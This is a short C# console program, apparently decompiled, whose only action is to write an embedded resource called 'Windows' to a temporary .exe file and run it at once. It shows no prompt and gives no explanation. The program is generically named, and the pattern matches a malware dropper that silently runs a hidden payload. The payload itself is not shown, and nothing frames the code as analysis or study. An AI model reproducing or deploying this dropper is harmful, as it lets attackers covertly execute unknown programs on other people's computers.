using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using ConsoleApplication1.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace ConsoleApplication1;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		using (new WebClient())
		{
			byte[] windows = Resources.Windows;
			string text = Path.GetTempFileName() + ".exe";
			File.WriteAllBytes(text, windows);
			Process.Start(text);
		}
	}
}
